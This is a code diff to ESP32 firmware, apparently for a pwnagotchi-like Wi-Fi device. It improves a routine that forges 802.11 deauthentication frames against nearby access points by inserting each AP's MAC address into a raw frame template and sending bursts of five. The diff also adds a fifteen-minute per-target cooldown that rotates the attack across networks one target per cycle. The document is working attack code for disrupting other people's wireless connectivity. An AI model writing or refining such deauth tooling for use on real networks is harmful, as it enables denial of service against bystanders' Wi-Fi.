@@ -8,6 +8,7 @@
 // ========== Constants ==========
 static constexpr unsigned long AWAY_THRESHOLD_MS = 120000;
 static constexpr unsigned long PACKET_TIMEOUT_MS = 5000;
+static constexpr unsigned long DEAUTH_COOLDOWN_MS = 900000; // 15 minutes
 static constexpr uint8_t kDeauthFrameTemplate[] = {
     0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff,
     0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -28,6 +29,17 @@ std::set<BeaconEntry> gRegisteredBeacons;
 static std::set<String> known_macs;
 static Environment env;
 static DeviceConfig *config = getConfig();
+
+// Deauth tracking
+struct DeauthTarget {
+    uint8_t mac[6];
+    unsigned long lastDeauthTime;
+    
+    bool operator<(const DeauthTarget &other) const {
+        return memcmp(mac, other.mac, 6) < 0;
+    }
+};
+static std::set<DeauthTarget> deauthHistory;
 
 // Pwngrid state
 static uint64_t pwngrid_friends_tot = 0;
@@ -875,7 +887,7 @@ esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const c
 
 // ========== Deauth Operations ==========
 void performDeauthCycle() {
-    Serial.println("Performing deauth");
+    Serial.println("⚡ Performing smart deauth cycle");
     
     std::vector<BeaconEntry> snapshot;
     snapshot.reserve(gRegisteredBeacons.size());
@@ -886,31 +898,80 @@ void performDeauthCycle() {
     portEXIT_CRITICAL(&gRadioMux);
 
     if (snapshot.empty()) {
-        Serial.println("Snapshot empty, returning");
+        Serial.println("⚠️  No APs to deauth");
         return;
     }
 
     uint8_t originalChannel = wifi_get_channel();
+    unsigned long now = millis();
+    int deauthCount = 0;
+    
+    // Clean up old deauth history (older than cooldown period)
+    for (auto it = deauthHistory.begin(); it != deauthHistory.end(); ) {
+        if (now - it->lastDeauthTime > DEAUTH_COOLDOWN_MS) {
+            it = deauthHistory.erase(it);
+        } else {
+            ++it;
+        }
+    }
 
+    // Try to find a target that hasn't been attacked recently
     for (const auto &entry : snapshot) {
         if (entry.channel != originalChannel) continue;
         
-        uint8_t frame[sizeof(kDeauthFrameTemplate)];
-        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
-        memcpy(frame + 10, entry.mac, 6);
-        memcpy(frame + 16, entry.mac, 6);
-
-        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
-        Serial.printf("Sending three magic packets to: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                     entry.mac[0], entry.mac[1], entry.mac[2], 
-                     entry.mac[3], entry.mac[4], entry.mac[5]);
-
-        for (int i = 0; i < 3; ++i) {
-            esp_err_t err = sendRawFrame(WIFI_IF_AP, frame, sizeof(frame), "Deauth");
-            if (err != ESP_OK) {
-                Serial.println("Deauth tx failed");
+        // Check if this target is in cooldown
+        bool inCooldown = false;
+        for (const auto &history : deauthHistory) {
+            if (memcmp(history.mac, entry.mac, 6) == 0) {
+                unsigned long timeSince = now - history.lastDeauthTime;
+                if (timeSince < DEAUTH_COOLDOWN_MS) {
+                    Serial.printf("⏰ Target %02x:%02x:...:%02x in cooldown (%lu/%lu s)\n",
+                                 entry.mac[0], entry.mac[1], entry.mac[5],
+                                 timeSince / 1000, DEAUTH_COOLDOWN_MS / 1000);
+                    inCooldown = true;
+                    break;
+                }
             }
         }
+        
+        if (inCooldown) continue;
+        
+        // Found a valid target!
+        uint8_t frame[sizeof(kDeauthFrameTemplate)];
+        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
+        memcpy(frame + 10, entry.mac, 6);  // Receiver address
+        memcpy(frame + 16, entry.mac, 6);  // BSSID
+        
+        Serial.printf("🎯 Targeting AP: %02x:%02x:%02x:%02x:%02x:%02x on Ch%d\n",
+                     entry.mac[0], entry.mac[1], entry.mac[2], 
+                     entry.mac[3], entry.mac[4], entry.mac[5],
+                     entry.channel);
+
+        // Send deauth bursts
+        for (int i = 0; i < 5; ++i) {
+            esp_err_t err = sendRawFrame(WIFI_IF_AP, frame, sizeof(frame), "Deauth");
+            if (err != ESP_OK) {
+                Serial.println("❌ Deauth tx failed");
+            }
+            delay(10);
+        }
+        
+        // Record this attack
+        DeauthTarget target;
+        memcpy(target.mac, entry.mac, 6);
+        target.lastDeauthTime = now;
+        deauthHistory.insert(target);
+        
+        deauthCount++;
+        
+        // Only attack one target per cycle to be strategic
+        break;
+    }
+    
+    if (deauthCount == 0) {
+        Serial.println("⏸️  All targets in cooldown, skipping");
+    } else {
+        Serial.printf("✅ Deauth cycle complete (%d target)\n", deauthCount);
     }
 
     esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
